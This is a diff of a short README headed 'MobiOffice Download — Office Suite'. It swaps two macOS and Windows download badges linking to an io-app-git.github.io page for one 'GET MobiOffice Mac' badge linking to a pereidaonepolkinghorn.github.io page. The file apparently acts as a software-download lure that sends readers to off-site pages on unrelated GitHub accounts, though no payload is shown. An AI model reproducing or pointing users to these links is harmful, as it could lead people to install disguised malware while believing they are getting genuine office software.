@@ -1,18 +1,7 @@
 # MobiOffice Download — Office Suite
 
-<a href="https://io-app-git.github.io/.github/?offer=MobiOffice" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/MobiOffice%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="MobiOffice for macOS">
-</a>
+[![GET MobiOffice Mac](https://img.shields.io/badge/GET%20%E2%80%94%20MobiOffice-Mac-0078D6?style=for-the-badge&logoColor=white)](https://pereidaonepolkinghorn.github.io/.github/MobiOffice-Mac)
 
-<a href="https://io-app-git.github.io/.github/?offer=MobiOffice" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/MobiOffice%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="MobiOffice for Windows">
-</a>
 
 ---
 
